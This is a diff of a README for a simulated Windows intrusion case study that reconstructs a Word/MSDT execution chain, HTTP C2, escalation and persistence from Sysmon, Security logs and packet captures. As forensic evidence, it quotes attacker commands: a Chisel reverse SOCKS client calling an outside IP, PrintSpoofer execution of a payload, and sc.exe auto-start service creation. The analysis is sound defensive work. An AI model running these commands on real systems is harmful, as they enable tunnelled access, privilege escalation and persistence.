@@ -1,1129 +1,336 @@
 # Multi-Stage Windows Intrusion Investigation
 
+> **Case study:** Simulated Windows incident response | **Focus:** Endpoint forensics, network analysis, privilege escalation, and persistence
+
 ## Executive Summary
 
-This project documents a simulated Windows incident investigation involving a multi-stage compromise that progressed from malicious document execution through command and control, reconnaissance, tunneling, privilege escalation, and persistent administrative access.
+This case study reconstructs a simulated, multi-stage Windows intrusion using Sysmon, Windows Security events, packet captures, and decoded command-and-control (C2) content. A malicious Word document led to an `msdt.exe` and PowerShell execution chain, followed by payload delivery, a Startup-folder persistence artifact, HTTP C2, host reconnaissance, Chisel reverse SOCKS activity, PrintSpoofer-associated privilege escalation, and local account manipulation. The attacker also issued commands to create automatically starting Windows services.
 
-The investigation correlated Sysmon telemetry, Windows Security events, and network traffic to reconstruct the attack sequence across the compromised endpoint. Key findings included execution initiated through a malicious Microsoft Word document, abuse of `msdt.exe` and encoded PowerShell, payload placement in a Startup location, HTTP-based command-and-control activity, deployment of a Chisel reverse SOCKS proxy, privilege escalation involving `SeImpersonatePrivilege`, SYSTEM-level execution, and creation of persistent local administrative accounts.
+**Most consequential confirmed outcomes:** creation of the `update.lnk` Startup artifact (Sysmon Event ID 11), decoded output reporting `NT AUTHORITY\SYSTEM`, creation of the local account `shion` (Security Event ID 4720), and its addition to the local Administrators group (Security Event ID 4732). Service-installation commands and Chisel invocation were observed, but successful service installation and tunnel use were **not** independently established.
 
-The focus of this case study is not individual alert identification, but reconstruction of the intrusion as a connected sequence of attacker behaviors supported by multiple evidence sources.
+The goal is to show how an analyst can correlate artifacts, distinguish attempts from verified outcomes, and translate findings into detection and response opportunities.
 
-## Investigation Scope
+## Scope, Evidence, and Tools
 
-The investigation focused on reconstructing attacker activity on a compromised Windows endpoint and answering several core incident-response questions:
+The investigation examined the initial execution chain, payloads, external communications, discovery commands, escalation, and persistence-related changes on the compromised Windows endpoint. It is based on a **simulated training scenario**, not a production incident or a live containment engagement.
 
-- How did malicious execution begin?
-- What processes and payloads were involved?
-- How was persistence established?
-- What command-and-control infrastructure was contacted?
-- What reconnaissance was performed after compromise?
-- How was tunneling used to support additional access?
-- How did the attacker escalate privileges?
-- What evidence showed SYSTEM-level execution?
-- What accounts or access mechanisms were created for persistence?
+| Source | Investigative use |
+| --- | --- |
+| Sysmon process and file events | Parent-child relationships, command lines, Startup artifact, attacker tooling |
+| Sysmon network events | Outbound connections associated with suspicious processes |
+| Windows Security logs | Account creation and local group membership changes |
+| Packet captures and decoded HTTP content | Domains, User-Agent, C2 instructions and identity output |
+| Script and command output | Credential exposure and host/network discovery |
 
-The investigation followed the attack from initial execution through post-exploitation and account manipulation rather than treating each artifact as an isolated event.
-
-The environment was a simulated training scenario. Findings are presented as an analyst investigation and are limited to behaviors supported by the preserved forensic evidence.
-
-## Evidence Sources and Tools
-
-### Evidence Sources
-
-The investigation used multiple telemetry sources to reconstruct the intrusion:
-
-- Sysmon event logs
-- Windows Security event logs
-- packet-capture data
-- process creation records
-- command-line arguments
-- network connection evidence
-- DNS and HTTP traffic
-- account-management events
-- group-membership changes
-
-Each source provided a different view of the compromise.
-
-Sysmon was particularly useful for reconstructing process relationships, command execution, file creation, and attacker tooling.
-
-Windows Security events provided evidence of account creation, account changes, password activity, and modification of privileged group membership.
-
-Network evidence was used to identify command-and-control infrastructure, HTTP communication, tunneling activity, and other external connections.
-
-### Analysis Tools
-
-Tools used during the investigation included:
-
-- EvtxECmd
-- Timeline Explorer
-- Wireshark
-- Brim
-- Windows Event Viewer
-- PowerShell
-
-The combination of endpoint and network analysis allowed findings to be validated across independent data sources where possible.
+**Analysis tools:** EvtxECmd, Timeline Explorer, Windows Event Viewer, PowerShell, Wireshark, and Brim.
 
 ## Attack Overview
 
-The intrusion began when a malicious Microsoft Word document triggered a child-process chain involving `msdt.exe` and encoded PowerShell.
-
-The attacker then retrieved additional payloads, established persistence through the Windows Startup mechanism, and began communicating with external command-and-control infrastructure.
-
-Post-compromise activity included reconnaissance, tunneling through a Chisel reverse SOCKS proxy, and privilege escalation. Following escalation, SYSTEM-level execution was established and additional local accounts were created and modified to preserve administrative access.
-
-At a high level, the intrusion progressed as follows:
-
 ```text
-Malicious Word document
-        ↓
-WINWORD.EXE
-        ↓
-msdt.exe
-        ↓
-Encoded PowerShell
-        ↓
-Stage 2 payload
-        ↓
-Startup persistence
-        ↓
-HTTP command and control
-        ↓
-Internal reconnaissance
-        ↓
-Chisel reverse SOCKS proxy
-        ↓
-Privilege escalation
-        ↓
-SYSTEM-level execution
-        ↓
-Local account creation
-        ↓
-Administrators group membership
-        ↓
-Persistent access
+Word document (free_magicules.doc)
+  -> WINWORD.EXE -> msdt.exe -> encoded PowerShell
+  -> update.zip download / update.lnk in Startup
+  -> HTTP C2 and post-compromise commands
+  -> credential and service discovery
+  -> Chisel reverse SOCKS client invocation
+  -> whoami /priv -> PrintSpoofer-associated execution
+  -> SYSTEM identity reported in decoded output
+  -> local account creation / Administrators membership
+  -> attempted automatic Windows service creation
 ```
 
-The sections below examine each stage using the preserved endpoint and network evidence.
+This is an **investigative sequence**, not a timestamp-verified event chronology. The following sections link findings to selected artifacts.
 
-## Initial Execution
+## 1. Initial Execution
 
-### Malicious Document
+### Malicious document and MSDT process chain
 
-![Malicious Word document execution](evidence/01-malicious-document-execution.png)
+The initial evidence associated `free_magicules.doc` with Microsoft Word and subsequent suspicious diagnostic-tool and PowerShell activity. The important signal was the *process relationship*—not the mere presence of legitimate Windows utilities.
 
-*Figure 1 — Sysmon process evidence showing Microsoft Word opening the malicious `free_magicules.doc` document.*
+![Word document execution evidence](evidence/01-malicious-document-execution.png)
 
-The investigation began with a malicious Microsoft Word document associated with the initial compromise.
+*Figure 1 — Process evidence associated with the malicious `free_magicules.doc` document.*
 
-Endpoint telemetry showed Microsoft Word launching a suspicious child-process chain rather than behaving like a normal document-viewing session.
+![MSDT and encoded PowerShell](evidence/02-msdt-encoded-powershell.png)
 
-The relevant progression was:
+*Figure 2 — `msdt.exe` invocation with PCWDiagnostic parameters and encoded PowerShell content.*
 
-```text
-Malicious Word document
-        ↓
-WINWORD.EXE
-        ↓
-msdt.exe
-        ↓
-PowerShell
-```
+The observed Word/MSDT/PowerShell sequence supported a document-triggered execution assessment. Encoded PowerShell is not inherently malicious, but its execution context and subsequent payload retrieval were suspicious.
 
-The relationship between `WINWORD.EXE` and the subsequent system utilities was important because the presence of `msdt.exe` or PowerShell alone would not necessarily indicate malicious activity.
+## 2. Payload Delivery and Startup Persistence
 
-The significance came from their appearance directly beneath the document process in the execution chain.
+Decoded PowerShell content showed retrieval of `update.zip` from `phishteam.xyz`, extraction into the user's Windows Startup directory, and deletion of the downloaded archive. A separate Sysmon file-creation event confirmed that `update.lnk` was written there.
 
-This provided the first strong evidence that opening the document resulted in attacker-controlled code execution on the endpoint.
+![Decoded payload retrieval](evidence/03-powershell-payload-download.png)
 
-### MSDT and Encoded PowerShell
+*Figure 3 — Decoded PowerShell showing the `update.zip` download and extraction sequence.*
 
-![MSDT and encoded PowerShell execution](evidence/02-msdt-encoded-powershell.png)
+![Startup folder artifact](evidence/04-startup-persistence.png)
 
-*Figure 2 — Sysmon command-line evidence showing `msdt.exe` invoked with PCWDiagnostic parameters and an embedded encoded PowerShell expression.*
+*Figure 4 — Sysmon Event ID 11 recording creation of `update.lnk` in a Startup directory.*
 
-The process chain showed abuse of `msdt.exe`, followed by PowerShell containing encoded command content.
+Placing a shortcut in Startup creates a potential logon-triggered persistence path. **File creation does not, by itself, prove that the shortcut executed at a later logon.**
 
-Encoded PowerShell can be used legitimately, but it is also commonly used to obscure scripts or commands from casual inspection.
+## 3. Command and Control
 
-In this investigation, its placement directly after the suspicious Word/MSDT sequence made it part of the confirmed malicious execution chain.
+Endpoint telemetry showed repeated outbound connections to `167.71.222.162`. Packet analysis independently identified HTTP requests associated with `resolvecyber.xyz`, including the `Nim httpclient/1.6.6` User-Agent and varying query-string content. This infrastructure was distinguished from the earlier `phishteam.xyz` payload-delivery domain.
 
-The sequence can be summarized as:
+![Sysmon outbound connections](evidence/05-sysmon-c2-connections.png)
 
-```text
-WINWORD.EXE
-      ↓
-msdt.exe
-      ↓
-Encoded PowerShell
-      ↓
-Attacker-controlled execution
-```
+*Figure 5 — Repeated outbound network connections to `167.71.222.162` in Sysmon telemetry.*
 
-The encoded PowerShell activity provided the bridge between initial document execution and retrieval of the next stage of the intrusion.
+![HTTP C2 traffic](evidence/06-http-c2-traffic.png)
 
-The investigation therefore treated the Word process tree as a connected execution chain rather than as several unrelated Windows processes.
+*Figure 6 — Brim HTTP evidence showing requests to `resolvecyber.xyz` and the `Nim httpclient/1.6.6` User-Agent.*
 
-## Stage 2 Payload and Persistence
+The unusual User-Agent helped identify related requests, but it is client-controlled and does not independently establish the underlying executable or malicious intent. Decoded HTTP command content provided stronger context for the C2 assessment.
 
-### Payload Delivery
+## 4. Post-Compromise Discovery
 
-![PowerShell payload download](evidence/03-powershell-payload-download.png)
+### Decoded C2 instructions
 
-*Figure 3 — Decoded PowerShell showing retrieval and extraction of `update.zip` from attacker-controlled infrastructure into the Windows Startup directory.*
+Base64-decoded content from captured HTTP traffic included `whoami` and local-account-related instructions. These showed what was communicated through the channel; a decoded command alone is not proof that it ran successfully on the endpoint.
 
-Decoding the PowerShell command revealed a download-and-extraction sequence targeting phishteam.xyz.
+![Decoded HTTP commands](evidence/07-c2-command-decoding.png)
 
-The command retrieved update.zip, extracted its contents into the user's Windows Startup directory, and removed the downloaded archive.
+*Figure 7 — HTTP stream and decoded command content, including `whoami`.*
 
-Sysmon file-creation evidence subsequently identified update.lnk in that location.
+### Credential material in a script
 
-This connected the initial document execution to the installation of the persistence mechanism.
+Investigative output exposed an `automation.ps1` script containing a domain username, a plaintext password assignment, and construction of a PowerShell `PSCredential` object. This was a clear credential-storage weakness; the evidence did not establish every subsequent use of those credentials.
 
-### Startup Persistence
+![Credential exposure in script](evidence/08-credential-discovery.png)
 
-![Windows Startup persistence](evidence/04-startup-persistence.png)
+*Figure 8 — `automation.ps1` output containing credential configuration. **Redact the plaintext password before publishing.***
 
-*Figure 4 — Sysmon Event ID 11 recording creation of `update.lnk` in the user's Startup folder.*
+### Listening-port enumeration
 
-The attacker established persistence by placing attacker-controlled content within a Windows Startup location.
+The attacker also executed `netstat -ano -p tcp`; captured output included listening TCP ports such as 445 and 5985 and their process IDs. This was consistent with discovery of host services potentially useful for later access.
 
-Artifacts showed files associated with the intrusion being written into a path that causes content to execute when a user signs in.
+![Listening TCP ports](evidence/09-listening-port-enumeration.png)
 
-This created a persistence mechanism independent of the original malicious Word document.
+*Figure 9 — TCP listening ports and associated process IDs from `netstat` output.*
 
-The progression was:
+## 5. Tunneling and Remote Access
 
-```text
-Downloaded payload
-        ↓
-Startup location
-        ↓
-User logon
-        ↓
-Automatic execution
-```
-
-Persistence through Startup folders is significant because it can survive the termination of the original process chain and allow attacker-controlled code to execute again during later user sessions.
-
-The investigation treated file placement and execution as separate questions. The presence of a file in the Startup location established the persistence mechanism, while subsequent process evidence was used where available to determine whether the payload later executed.
-
-### Stage 2 Significance
-
-By the end of this stage, the attacker had moved beyond one-time document execution.
-
-The compromise now included:
-
-- a second-stage payload,
-- use of legitimate Windows tooling for file retrieval,
-- and a persistence mechanism capable of surviving the initial execution session.
-
-This established the foundation for the later command-and-control, reconnaissance, tunneling, and privilege-escalation activity observed in the remainder of the investigation.
-
-## Command and Control
-
-Following the initial malicious document execution and establishment of Startup persistence, the investigation shifted to network telemetry to identify external communication associated with the compromised endpoint.
-
-Packet-capture analysis provided visibility into outbound connections, HTTP requests, destination infrastructure, and client-identification strings. These artifacts helped connect the endpoint execution chain to the attacker's command-and-control (C2) activity.
-
-### C2 Infrastructure
-
-Network analysis identified communication involving the external domain:
-
-```text
-resolvecyber.xyz
-```
-
-The domain was investigated in the context of the suspicious endpoint activity rather than being classified as malicious based on its name alone.
-
-The surrounding attack sequence established that the endpoint had already executed attacker-controlled code, retrieved additional payloads, and created a persistence artifact. Subsequent communication with the external infrastructure was therefore treated as potentially related to the ongoing intrusion.
-
-The investigation distinguished between the earlier payload-delivery infrastructure and the infrastructure observed during subsequent C2 activity.
-
-![Repeated outbound connections in Sysmon](evidence/05-sysmon-c2-connections.png)
-
-*Figure 5 — Sysmon network telemetry showing repeated outbound connections to `167.71.222.162` from the same process context.*
-
-### HTTP Communication
-
-The packet capture contained HTTP activity associated with the compromised endpoint.
-
-Review of HTTP requests and related network metadata provided visibility into the external destination and application-layer communication behavior.
-
-This complemented the Sysmon investigation:
-
-```text
-Malicious document execution
-        ↓
-PowerShell payload retrieval
-        ↓
-Startup persistence
-        ↓
-Suspicious HTTP communication
-        ↓
-C2-related activity
-```
-
-The HTTP evidence was examined alongside endpoint artifacts to determine how the network activity fit into the broader attack sequence.
-
-Where request or response content was available, it provided additional context about the activity. Network connections alone were not treated as proof of the exact commands executed on the endpoint.
-
-![HTTP command-and-control traffic in Brim](evidence/06-http-c2-traffic.png)
-
-*Figure 6 — Brim analysis showing repeated HTTP GET requests to `resolvecyber.xyz`, including variable query-string content and the `Nim httpclient/1.6.6` User-Agent.*
-
-### User-Agent Analysis
-
-One distinctive network artifact was the HTTP User-Agent:
-
-```text
-Nim httpclient/1.6.6
-```
-
-This value indicated that the HTTP client identified itself as a Nim HTTP client rather than a conventional web browser.
-
-The User-Agent was useful because it could help distinguish suspicious application-generated requests from ordinary interactive browsing.
-
-However, User-Agent strings are client-controlled and can be modified or spoofed. The value was therefore treated as an investigative indicator rather than definitive proof of the software responsible for the communication.
-
-Its significance came from the correlation between the unusual HTTP client behavior and the independently identified malicious endpoint activity.
-
-### C2 Investigation Findings
-
-The network investigation established several important findings:
-
-1. The compromised environment contained suspicious HTTP communication associated with external infrastructure.
-2. `resolvecyber.xyz` was identified during investigation of the attacker's network activity.
-3. The `Nim httpclient/1.6.6` User-Agent provided an additional indicator for identifying related requests.
-4. Network evidence complemented the endpoint execution and persistence findings, strengthening reconstruction of the ongoing compromise.
-
-The combination of endpoint and network telemetry supported the assessment that the intrusion had progressed beyond initial execution into sustained attacker communication.
-
-The investigation then continued into internal reconnaissance, tunneling, and other post-compromise activity.
-
-## Internal Reconnaissance
-
-After establishing command-and-control communication, the attacker began gathering information about the compromised Windows environment.
-
-The preserved network and endpoint evidence showed post-compromise commands aimed at identifying the current execution context, locating potentially useful information, and discovering services that could support additional access.
-
-### C2 Command Decoding
-
-Packet analysis provided visibility into HTTP content associated with the attacker's command-and-control infrastructure.
-
-A captured HTTP response contained Base64-encoded content that decoded to:
-
-```text
-whoami
-```
-
-Additional decoded command content included a local-account creation command.
-
-The decoded `whoami` instruction demonstrated an attempt to identify the current Windows execution context, while the account-creation command indicated activity extending beyond reconnaissance into account manipulation.
-
-![Decoded C2 command activity](evidence/07-c2-command-decoding.png)
-
-*Figure 7 — HTTP-stream analysis and Base64 decoding identifying command content, including `whoami`, associated with the attacker-controlled communication channel.*
-
-### Credential Discovery
-
-Investigation of the attacker's command activity revealed attempts to locate information useful for further authentication or movement through the environment.
-
-The significance of this activity came from its position in the intrusion sequence. The endpoint had already experienced malicious document execution, payload delivery, persistence, and suspicious network communication.
-
-Credential-related discovery therefore represented an expansion of the compromise rather than normal system administration.
-
-The investigation distinguished discovery of potentially sensitive information from confirmed credential extraction. The available evidence must support each conclusion separately.
-
-Review of the PowerShell command output also exposed credential material stored in `automation.ps1` under the compromised user's Desktop directory.
-
-The script contained a domain username, a plaintext password assignment, and PowerShell commands constructing a `PSCredential` object.
-
-This represented a potential credential-exposure opportunity because the script stored reusable authentication material in a recoverable form.
-
-![Credential material identified in PowerShell script](evidence/08-credential-discovery.png)
-
-*Figure 8 — PowerShell output showing embedded domain credential configuration in `automation.ps1`, with the plaintext password redacted.*
-
-### Service and Port Enumeration
-
-The attacker also investigated network services and listening ports on the compromised host.
-
-Identifying listening services can reveal opportunities for remote access, lateral movement, or further exploitation.
-
-The observed behavior was consistent with post-compromise reconnaissance intended to establish what additional access mechanisms were available.
-
-The investigation considered the surrounding process and command context rather than treating port-enumeration utilities as inherently malicious.
-
-The attacker also executed:
-
-`netstat -ano -p tcp`
-
-The command output identified several listening TCP ports, including TCP/445 and TCP/5985, along with their associated process IDs.
-
-These results provided information about services available on the compromised endpoint and potential opportunities for additional access.
-
-![TCP listening ports and process IDs](evidence/09-listening-port-enumeration.png)
-
-*Figure 9 — Windows `netstat` output identifying listening TCP ports and associated process IDs during post-compromise reconnaissance.*
-
-### Investigation Significance
-
-The reconnaissance activity demonstrated that the attacker was using the compromised endpoint as more than a temporary execution environment.
-
-By identifying useful information and reachable services, the attacker was preparing for subsequent actions involving tunneling, remote access, and privilege escalation.
-
-These observations helped bridge the earlier command-and-control activity with the later deployment of Chisel and additional post-exploitation tooling.
-
-## Tunneling and Remote Access
-
-Following command-and-control activity and internal reconnaissance, the investigation identified tooling associated with network tunneling.
-
-The attacker used Chisel, a legitimate TCP tunneling utility that supports encrypted connections and reverse SOCKS proxying. In the context of this intrusion, Chisel provided a mechanism for extending network access through the compromised Windows endpoint.
-
-### Chisel Reverse SOCKS Proxy
-
-Forensic evidence identified a Chisel client executing on the compromised system.
-
-The observed command configuration established a reverse connection to attacker-controlled infrastructure, using Chisel's reverse SOCKS functionality.
-
-The relevant activity can be summarized as:
-
-```text
-Compromised Windows endpoint
-        ↓
-Chisel client execution
-        ↓
-Outbound connection to Chisel server
-        ↓
-Reverse SOCKS proxy
-        ↓
-Potential access to internal network resources
-```
-
-A reverse SOCKS proxy differs from a conventional inbound connection because the compromised system initiates the connection outward.
-
-This can allow an attacker to route traffic through the compromised system without requiring the attacker to establish a new direct inbound connection through the target's network perimeter.
-
-The use of Chisel was significant because the attacker had already enumerated listening services and investigated the internal environment.
-
-Together, these activities were consistent with preparation for additional remote access and network movement.
-
-Sysmon process-creation evidence recorded the following command:
+Sysmon process telemetry showed `ch.exe` launched by `C:\Users\Public\Downloads\first.exe` with the following Chisel parameters:
 
 ```text
 "C:\Users\benimaru\Downloads\ch.exe" client 167.71.199.191:8080 R:socks
 ```
 
-The client argument indicates that the compromised endpoint initiated the connection to the remote Chisel server. The R:socks parameter specifies reverse SOCKS functionality.
+![Chisel invocation](evidence/10-chisel-reverse-socks.png)
 
-The process was launched by:
+*Figure 10 — Chisel client invocation with reverse SOCKS parameters and its parent process.*
 
-C:\Users\Public\Downloads\first.exe
-This parent-child relationship connected the tunnel to the previously identified attacker-controlled execution chain.
+The command indicated an attempt to establish a reverse SOCKS path through the compromised endpoint. It **did not independently prove** successful tunnel establishment, traffic relay, or a particular subsequent remote authentication session. Confirming such use would require matching flow and authentication evidence.
 
-![Chisel reverse SOCKS proxy execution](evidence/10-chisel-reverse-socks.png)
+## 6. Privilege Escalation
 
-*Figure 10 — Sysmon process evidence showing `ch.exe` launched with reverse SOCKS tunneling parameters. The process was spawned by `first.exe`, connecting the tunneling activity to the earlier post-compromise execution chain.*
+Process evidence showed `whoami /priv` executed to enumerate token privileges. The wider investigation identified `SeImpersonatePrivilege` as relevant, although Figure 11 depicts the enumeration command rather than independently showing its output.
 
-### Remote Authentication Activity
+![Privilege enumeration](evidence/11-privilege-enumeration.png)
 
-The investigation also identified remote authentication activity associated with the later stages of the intrusion.
+*Figure 11 — PowerShell-associated `whoami /priv` execution.*
 
-This activity was analyzed alongside the tunneling evidence to understand how the attacker attempted to extend access beyond the initial endpoint.
+Later telemetry showed `spf.exe`, identified in the investigation as PrintSpoofer, being retrieved and executed with the payload `final.exe`:
 
-The observed use of tunneling and authentication mechanisms demonstrated a transition from endpoint control toward broader access within the environment.
+```text
+spf.exe -c C:\ProgramData\final.exe
+```
 
-Importantly, the presence of a reverse SOCKS tunnel does not independently prove that a particular internal connection was successfully routed through it.
+![PrintSpoofer execution](evidence/12-printspoofer-execution.png)
 
-Establishing that relationship would require supporting network-flow, authentication, or process evidence connecting the tunnel to a specific remote session.
+*Figure 12 — Process evidence for `spf.exe` execution referencing `final.exe`.*
 
-### Investigation Findings
+Decoded command output subsequently reported `nt authority\system`.
 
-The tunneling investigation supported the following conclusions:
+![SYSTEM identity output](evidence/13-system-access-confirmation.png)
 
-1. Chisel was identified among the attacker-associated tooling.
-2. Command-line evidence showed configuration consistent with reverse SOCKS tunneling.
-3. The activity occurred after C2 establishment and reconnaissance.
-4. The reverse tunnel provided a potential pathway for accessing additional internal resources.
-5. The available evidence should be used to distinguish tunnel establishment from confirmed use of the tunnel for specific lateral-movement actions.
+*Figure 13 — Decoded identity output reporting `nt authority\system`.*
 
-This stage demonstrated how a compromised endpoint can become an intermediary for additional network access, making outbound tunneling activity an important detection opportunity during incident response.
+Taken together, the tool execution and later identity output support escalation to the SYSTEM context. The exact exploit mechanics were **not** independently reconstructed from low-level telemetry, and the presence of `SeImpersonatePrivilege` alone does not prove exploitation.
 
-## Privilege Escalation
+## 7. Account Manipulation and Persistence
 
-Following the establishment of command-and-control communication and reverse SOCKS tunneling, the investigation identified activity associated with privilege escalation on the compromised Windows endpoint.
+### Account-management commands
 
-Process-creation and command-line evidence showed the attacker examining the privileges available to the current security context before executing additional tooling.
+Process evidence showed `net.exe` commands directed at local accounts `shion` and `shuna`, including password modifications and privileged-group changes. The command sequence also included activity affecting the built-in Administrator account. These are **observed commands**, not proof that each requested change succeeded.
 
-### SeImpersonatePrivilege
+![Account manipulation commands](evidence/14-account-manipulation-commands.png)
 
-Windows process telemetry showed execution of the following command:
+*Figure 14 — Account-management commands and related post-escalation activity. **Redact every displayed plaintext password before publishing.***
 
-`whoami /priv`
+### Confirmed account changes
 
-This command enumerates the privileges assigned to the current process security token.
+A Windows Security Event ID **4720** independently confirmed creation of `shion`. A separate Event ID **4732** confirmed addition of `shion` to the built-in Administrators group. The preserved screenshots do not independently confirm every resulting state for `shuna`.
 
-![Windows privilege enumeration](evidence/11-privilege-enumeration.png)
+![Local account creation](evidence/15-local-account-creation.png)
 
-*Figure 11 — Process-creation evidence showing PowerShell invoking `whoami /priv` to enumerate the current security token's privileges.*
+*Figure 15 — Security Event ID 4720 confirming creation of `shion`.*
 
-The output identified `SeImpersonatePrivilege`, a Windows privilege that allows a process to impersonate another security context under applicable conditions.
+![Administrators group membership](evidence/16-administrator-group-membership.png)
 
-While this privilege can be present during legitimate Windows operations, it can also be abused by local privilege-escalation techniques.
+*Figure 16 — Security Event ID 4732 confirming `shion` was added to Administrators.*
 
-Subsequent process evidence identified the retrieval and execution
-of `spf.exe`, which was identified during the investigation as
-PrintSpoofer.
+Other relevant account-audit events include 4722 (account enabled), 4724 (password-reset attempt), and 4738 (account changed). Interpret each event using its recorded fields rather than presuming that every account-management command succeeded.
 
-The observed execution included:
+### Windows service creation attempts
 
-`spf.exe -c C:\ProgramData\final.exe`
-
-This linked privilege enumeration to the launch of the next
-attacker-controlled payload.
-
-![PrintSpoofer privilege escalation](evidence/12-printspoofer-execution.png)
-
-*Figure 12 — Process evidence showing the retrieval of `spf.exe` and its execution with `final.exe`, followed by additional identity-verification activity.*
-
-In the context of the ongoing intrusion, the enumeration was significant because it preceded subsequent activity associated with elevated execution.
-
-The evidence established that the attacker investigated the available privileges. The presence of `SeImpersonatePrivilege` alone did not prove successful exploitation.
-
-### SYSTEM-Level Access
-
-Subsequent attacker activity indicated that execution had progressed to the Windows `NT AUTHORITY\SYSTEM` security context.
-
-SYSTEM is a highly privileged local Windows security identity used by operating-system services and components.
-
-Decoded command-output evidence contained the result:
-
-`nt authority\system`
-
-This supported the assessment that attacker-controlled execution
-had reached the SYSTEM security context following the PrintSpoofer
-activity.
-
-![SYSTEM-level identity confirmation](evidence/13-system-access-confirmation.png)
-
-*Figure 13 — Decoded command output reporting `nt authority\system`, supporting successful privilege escalation to the SYSTEM security context.*
-
-Attacker-controlled execution at this level can provide broad access to local resources and support additional persistence or security-control tampering.
-
-The investigation correlated the privilege-enumeration activity with later process and command evidence supporting SYSTEM-level execution.
-
-This distinction was important:
-
-- **Privilege discovery:** the attacker examined available token privileges using `whoami /priv`.
-- **Privilege escalation:** subsequent behavior indicated a transition into a more privileged security context.
-- **SYSTEM-level execution:** later artifacts supported attacker-controlled command execution under `NT AUTHORITY\SYSTEM`.
-
-The preserved evidence supports the progression to SYSTEM-level activity, but the precise exploitation mechanism should not be inferred solely from the presence of `SeImpersonatePrivilege`.
-
-### Investigation Findings
-
-The privilege-escalation investigation established the following:
-
-1. The attacker enumerated the current Windows privileges using `whoami /priv`.
-2. `SeImpersonatePrivilege` was identified as an available privilege.
-3. Subsequent activity supported execution in the SYSTEM security context.
-4. The escalation occurred after the initial compromise, command-and-control activity, and tunneling-related execution.
-5. The exact privilege-escalation mechanism requires evidence beyond privilege enumeration alone.
-
-This stage was significant because SYSTEM-level access expanded the potential impact of the compromise and preceded the account-management activity investigated in the following section.
-
-## Persistence and Account Manipulation
-
-Following privilege escalation to `NT AUTHORITY\SYSTEM`, the investigation identified additional activity intended to maintain access to the compromised Windows endpoint.
-
-Windows Security events and process evidence were used to examine local account creation, modifications to account properties, privileged group membership, and additional persistence-related activity.
-
-Unlike the earlier Startup-folder persistence mechanism, these actions established alternative means of accessing or controlling the system after the initial compromise.
-
-### Local Account Creation
-
-Windows Security telemetry recorded the creation of two local user accounts:
-
-- `shion`
-- `shuna`
-
-Event ID `4720` provided evidence of new account creation.
-
-![Local account creation event](evidence/15-local-account-creation.png)
-
-*Figure 15 — Windows Security Event ID 4720 confirming creation of the local account `shion`, with the action recorded under the SYSTEM security context.*
-
-Although process evidence showed commands targeting both `shion` and `shuna`, the preserved Event ID 4720 screenshot specifically confirms the creation of `shion`.
-
-The commands involving `shuna` are documented separately as account-manipulation activity. The available screenshot does not independently establish every resulting account state.
-
-Additional account-management events were examined to understand the changes made after these accounts were introduced.
-
-Relevant events included:
-
-| Event ID | Description | Investigative Value |
-| --- | --- | --- |
-| `4720` | User account created | Establishes the creation of a new account |
-| `4722` | User account enabled | Indicates that an account was enabled |
-| `4724` | Password reset attempted | Indicates password-reset activity, with the event's recorded outcome requiring review |
-| `4738` | User account changed | Provides evidence of account-property modifications |
-
-These events were analyzed as a related sequence rather than isolated administrative operations.
-
-Within the context of the confirmed intrusion, the creation and modification of previously unrecognized accounts was consistent with establishing additional persistent access.
-
-### Administrator Group Membership
-
-The investigation also identified account activity involving the local Administrators group.
-
-Windows Security Event ID `4732` recorded a member being added to a security-enabled local group.
-
-The event details were examined to determine the affected group and the account receiving membership.
-
-Adding an attacker-controlled account to the Administrators group provides a potential route to continued privileged access through normal Windows authentication mechanisms.
-
-This form of persistence is particularly significant because it may remain available even after the original malicious document, downloaded payload, or reverse shell has been removed.
-
-However, creation of an account and membership in Administrators do not independently prove a subsequent successful login using that account.
-
-![Administrator group membership change](evidence/16-administrator-group-membership.png)
-
-*Figure 16 — Windows Security Event ID 4732 confirming that the local account `shion` was added to the built-in Administrators group.*
-
-### Additional Persistent Access
-
-Further process-creation evidence revealed that the attacker used Windows Service Control (`sc.exe`) to create additional persistence mechanisms.
-
-The observed commands included:
+The attacker also launched `sc.exe` commands targeting `TEMPEST` to request two automatically starting services, both referencing `C:\ProgramData\final.exe`:
 
 ```text
 sc.exe \\TEMPEST create TempestUpdate binpath= C:\ProgramData\final.exe start= auto
-
 sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
 ```
 
-Both commands specified the same executable:
+![Windows service creation attempts](evidence/17-windows-service-persistence.png)
 
-`C:\ProgramData\final.exe`
+*Figure 17 — `sc.exe` process evidence requesting automatic service creation for `TempestUpdate` and `TempestUpdate2`.*
 
-The `start= auto` parameter requested automatic service startup, allowing the payload to be launched when Windows starts if the service creation succeeded and the service remained enabled.
+These commands demonstrated **attempted service-based persistence**. The preserved material did not independently verify installation, startup, or execution of either service; a service-install event such as Windows System Event ID 7045 or direct service-state evidence would help resolve that question.
 
-![Windows service persistence commands](evidence/17-windows-service-persistence.png)
-
-*Figure 17 — Process-creation evidence showing `sc.exe` commands configured to create two automatically starting services referencing `final.exe`.*
-
-This activity represented an additional persistence attempt distinct from the previously identified Startup-folder shortcut and privileged local accounts.
-
-The preserved screenshot confirms execution of the service-creation commands, but does not independently confirm both services were successfully installed and started.
-
-### Account-Manipulation Command Sequence
-
-Additional process evidence showed the attacker using `net.exe` to create and modify local accounts, enumerate users, and change privileged account credentials.
-
-![Windows account manipulation activity](evidence/14-account-manipulation-commands.png)
-
-*Figure 14 — Process evidence showing account creation, password modification, local Administrators group changes, and service-creation commands during post-escalation activity. Plaintext passwords have been redacted.*
-
-These commands provide context for the Windows Security account-management events and demonstrate that the attacker was attempting multiple methods of maintaining administrative access.
-
-### Persistence Findings
-
-The account-management and service investigation supported the following conclusions:
-
-1. Process evidence showed commands creating and modifying the local accounts `shion` and `shuna`.
-2. Windows Security Event ID `4720` independently confirmed creation of `shion`.
-3. Event ID `4732` confirmed that `shion` was added to the built-in Administrators group.
-4. Additional commands attempted to modify local account passwords, including the built-in Administrator account.
-5. `sc.exe` was used to request creation of two automatically starting Windows services, `TempestUpdate` and `TempestUpdate2`, both referencing `C:\ProgramData\final.exe`.
-6. The observed account and service activity provided additional persistence opportunities independent of the earlier Startup-folder mechanism.
-
-Together, these findings identified three distinct approaches to maintaining access during the intrusion: Startup-folder persistence, privileged local accounts, and attempted automatic Windows service installation.
+**Persistence assessment:** The case includes a confirmed Startup-folder artifact, confirmed creation and elevation of a local account, and observed commands to configure auto-start services. Subsequent use of the account and successful service startup remain unverified.
 
 ## Attack Timeline
 
-The investigation reconstructed a multi-stage Windows intrusion by correlating Sysmon events, Windows Security logs, decoded command-and-control content, and network traffic.
+The entries below are ordered by reconstructed attack progression, **not verified wall-clock timestamps**.
 
